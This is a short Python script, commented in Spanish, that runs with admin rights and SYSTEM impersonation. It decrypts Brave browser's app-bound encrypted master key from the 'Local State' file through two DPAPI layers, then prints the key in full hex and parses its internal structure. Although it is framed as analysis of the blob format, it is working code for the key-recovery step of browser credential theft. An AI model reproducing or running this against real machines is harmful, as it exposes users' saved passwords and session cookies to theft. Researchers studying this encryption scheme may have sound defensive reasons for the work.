"""
Analiza el blob completo de Brave para descubrir la estructura interna.
Requiere ejecutarse como ADMIN (para la impersonación SYSTEM).
"""
import os, sys, sqlite3, shutil, base64, struct, io
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

try:
    import win32crypt
except ImportError:
    print("ERROR: win32crypt no disponible. Ejecutar como admin.")
    sys.exit(1)

from modules.chrome_v20_decryption.v20_decryptor import TokenManager

roaming = Path(os.environ["APPDATA"])
local = Path(os.environ["LOCALAPPDATA"])
browsers = {
    "Brave": local / "BraveSoftware/Brave-Browser/User Data",
}

for name, base in browsers.items():
    ls = base / "Local State"
    if not ls.exists():
        print(f"[{name}] Local State not found")
        continue

    import json
    config = json.loads(ls.read_text("utf-8"))
    app_bound_b64 = config.get("os_crypt", {}).get("app_bound_encrypted_key")
    if not app_bound_b64:
        print(f"[{name}] No app_bound_encrypted_key")
        continue

    raw = base64.b64decode(app_bound_b64)
    if not raw.startswith(b"APPB"):
        print(f"[{name}] No APPB prefix")
        continue

    key_blob_encrypted = raw[4:]
    print(f"[{name}] Encrypted blob len: {len(key_blob_encrypted)}")

    try:
        with TokenManager():
            key_blob_system = win32crypt.CryptUnprotectData(key_blob_encrypted, None, None, None, 0)[1]
        print(f"[{name}] After SYSTEM DPAPI: {len(key_blob_system)} bytes")
    except Exception as e:
        print(f"[{name}] SYSTEM DPAPI failed: {e}")
        continue

    try:
        key_blob_user = win32crypt.CryptUnprotectData(key_blob_system, None, None, None, 0)[1]
        print(f"[{name}] After USER DPAPI:   {len(key_blob_user)} bytes")
        print(f"[{name}] Full hex: {key_blob_user.hex()}")
        print(f"[{name}] First 32 bytes decoded:")

        buf = io.BytesIO(key_blob_user)
        header_len = struct.unpack('<I', buf.read(4))[0]
        print(f"  header_len = {header_len}")
        header = buf.read(header_len)
        print(f"  header     = {header.hex()}")
        content_len_raw = buf.read(4)
        content_len = struct.unpack('<I', content_len_raw)[0] if len(content_len_raw) == 4 else -1
        print(f"  content_len = {content_len}")
        flag_byte_raw = buf.read(1)
        flag = flag_byte_raw[0] if flag_byte_raw else -1
        print(f"  flag        = {flag} (0x{flag:02x})")
        remaining = buf.read()
        print(f"  remaining   = {len(remaining)} bytes = {remaining.hex()[:64]}...")
    except Exception as e:
        print(f"[{name}] User DPAPI or parse failed: {e}")
